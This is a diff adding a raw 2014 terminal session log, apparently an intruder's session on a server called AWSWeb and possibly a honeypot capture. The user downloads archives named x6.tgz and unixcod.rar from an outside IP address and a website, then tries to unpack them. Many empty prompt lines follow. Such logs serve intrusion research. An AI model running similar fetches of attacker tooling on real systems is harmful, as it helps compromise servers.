@@ -1,0 +1,158 @@
+[4hAWSWeb:~# wget http://81.86.153.92/dd/x6.tgz
+[4l--2014-04-13 12:53:08--  http://81.86.153.92/dd/x6.tgz
+Connecting to 81.86.153.92:80... connected.
+HTTP request sent, awaiting response... User timeout caused connection failure.
+[4hAWSWeb:~# wget http://www.iphobos.com/hb/unixcod.rar
+[4l--2014-04-13 13:01:10--  http://www.iphobos.com/hb/unixcod.rar
+Connecting to www.iphobos.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 332774 (324K) [application/x-rar-compressed]
+Saving to: `unixcod.rar
+
+ 0% [>                                      ] 1,071        1K/s  eta 2m 47s93% [====================================>  ] 309,495      295K/s  eta 0s  100%[======================================>] 332,774      295K/s
+
+2014-04-13 13:01:11 (295 KB/s) - `unixcod.rar' saved [332774/332774]
+[4hAWSWeb:~# tar -zxvf unixcod.tar.a[1D[1Ptar
+[4ltar: unixcod.tar.tar: Cannot open: No such file or directory
+tar: Error is not recoverable: exiting now
+tar: Child returned status 2
+tar: Error exit delayed from previous errors
+[4hAWSWeb:~# unrar unixcod.rar
+bash: unrar: command not found
+AWSWeb:~# apt-get istall[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pinstall unrar
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  unrar 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 285.2kB of archives.
+After this operation, 627.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main unrar 0.24-5 [285.2kB]
+Fetched 285.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking unrar (from .../archives/unrar_0.24-5_i386.deb) ...
+Processing triggers for man-db ...
+Setting up unrar (0.24-5) ...
+[4hAWSWeb:~# unrar unixcod.rar
+[4lunrar: Segmentation fault
+[4hAWSWeb:~# /tmp$ cd rar
+bash: /tmp$: command not found
+AWSWeb:~# cd rd[1D[1Par
+[4lbash: cd: rar: No such file or directory
+[4hAWSWeb:~# unrar e unixcod.rar
+[4lunrar: Segmentation fault
+[4hAWSWeb:~# unrar: Segmentation fault
+bash: unrar:: command not found
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
